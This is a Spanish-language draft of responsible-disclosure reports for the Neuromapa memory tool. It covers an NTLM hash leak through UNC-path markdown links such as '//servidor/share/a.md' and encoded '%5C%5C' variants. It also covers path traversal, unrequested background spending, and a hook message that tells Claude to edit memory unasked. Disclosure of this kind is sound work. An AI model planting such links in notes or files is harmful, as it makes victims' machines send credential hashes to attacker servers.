# Texto listo para reportar a Neuromapa (lumiel777/neuromapa)

Esto **no se ha enviado**; enviarlo es decisión de Jorge.

El `SECURITY.md` de Neuromapa pide no abrir issues públicos para fallas de seguridad. Por eso:

- el reporte 1 va por **Security → Report a vulnerability** en
  https://github.com/lumiel777/neuromapa/security/advisories/new;
- los reportes 2 y 3 pueden ir como issues normales.

El repositorio original está escrito con voseo; los textos de abajo también.

---

## 1. (Privado, seguridad) El hook de edición toca rutas de red sacadas del texto de una nota (filtra el hash NTLM en Windows)

**Versión:** 0.1.5 · **Archivo:** `medico.py`, `enlaces_rotos` (alrededor del renglón 545); lo llama
`hook_choques.py` (`aviso_rutas`) en cada PostToolUse de Edit, Write o MultiEdit sobre una nota de memoria, aunque el
contexto automático esté apagado.

**Qué pasa:** para cada enlace `.md` del texto nuevo, `enlaces_rotos` hace `(carpeta / nombre).is_file()`. Si el
enlace es `[x](//servidor/share/a.md)`, `[x](<\\servidor\share\b.md>)` o `[x](%5C%5Cservidor%5Cshare%5Ce.md)`, la
unión da una ruta UNC absoluta, y en Windows el `stat` abre SMB contra ese servidor y le entrega el hash NTLMv2 del
usuario. El resto del médico ya evita la red con `es_de_red`; esta función quedó afuera. El texto puede llegar a la
memoria desde contenido externo (una página o un correo que Claude resume), y el hook corre sin que nadie lo pida.

**Cómo reproducirlo:** en una memoria de prueba, interceptá `os.stat` (o mirá el tráfico SMB) y llamá
`medico.enlaces_rotos(ruta_nota, "[x](//servidor-falso.invalid/share/a.md)")`. Se ve el `stat` sobre
`\\servidor-falso.invalid\share\a.md`.

**Arreglo propuesto:** no hacer `is_file()` si el destino es de red (`es_de_red`, antes y después de unir), si es
absoluto, si tiene letra de unidad o si sale de la carpeta de la nota; esos enlaces se pueden mandar directo a la
resolución en memoria del cerebro. En Cerebrario lo resolvimos con una función `se_puede_mirar`, con pruebas para
`//host`, `\\host`, `%5C%5C`, `%2F%2F`, `file://`, `\\?\UNC\` y `C:/`.

---

## 2. Con el contexto automático apagado igual se lanzan pasadas de fondo, y el aviso le ordena a Claude editar la memoria

**Versión:** 0.1.5 · **Archivos:** `hook_servir.py` (`avisos` y `dormido` no miran si el contexto está prendido),
`problemas.py` (texto del aviso), `dormir.py` (`despertar`).

**Qué pasa:** con `servir_contexto=false` (el valor por defecto), cada pedido puede lanzar de fondo `cerebro.py
--dormir`. Si el `config.json` trae `dormir_con_claude`, esa pasada llama a `claude -p` y gasta de la cuenta del
usuario sin aviso previo; si trae `partir_sola`, parte notas de memoria. Además, el aviso de problemas cierra con «Si es
de la memoria, arreglalo», que le pide a Claude editar la memoria sin que el usuario lo haya pedido. Por último, el
gasto de `dormir_con_claude` se anota recién al final de la pasada: si el proceso muere a la mitad, lo gastado no
queda registrado.

**Propuesta:**
- que el contexto apagado apague también la pasada de fondo;
- que lo que gasta dinero o reescribe notas corra solo a mano;
- que el aviso diga «avisale en una línea; no los arregles salvo que lo pida»;
- que el gasto se anote después de cada llamada.

---

## 3. Otros bugs, de severidad media y baja

- **`historial.py` con memorias grandes:** el `git add` corre en el hook Stop síncrono con un tope de 4 s. Con unas
  8,000 notas lo matan, queda `index.lock` y el historial nunca guarda. Propuesta: correrlo de fondo con candado
  propio.
- **`ordenar.py --partir --destino`:** acepta `..` y rutas absolutas. En una prueba agregó texto al `CLAUDE.md`
  global. Propuesta: aceptar solo el nombre de una nota hermana.
- **`ordenar.py --renombrar`:** acepta `#`, `]` y `^` y nombres reservados de Windows, y saltea en silencio las notas
  cp1252, que quedan con enlaces rotos.
- **`medico.anclas_de_nodo`:** crece con el cuadrado; un renglón de 5 MB lleva `--salud` a unos 300 s. Se resuelve
  buscando los comienzos de renglón con `bisect`.
- **`textos.citar`:** deja pasar controles, bidi (U+202E) y etiquetas `</…>`, que entran en la pista.
- **OneDrive «solo en línea»:** ninguna lectura mira `st_file_attributes`. El rearmado del índice cada 15 min y las
  pasadas de fondo bajan todas las notas.
- **`servidor.py`:**
  - un surrogate suelto en `eventos.jsonl` tumba `/eventos`;
  - hay una carrera en `clave()`;
  - las firmas de `/entrada` y `/apagar` se pueden repetir;
  - las conexiones no tienen tope de tiempo.
- **`permisos.crear`:** le quita la herencia a carpetas intermedias que crea fuera de la carpeta de datos.

Para cada uno hay una prueba que falla en 0.1.5 y pasa con el arreglo, en `herramientas/pruebas_*.py` de
https://github.com/jorgpt/cerebrario. Con gusto los mandamos como PR.
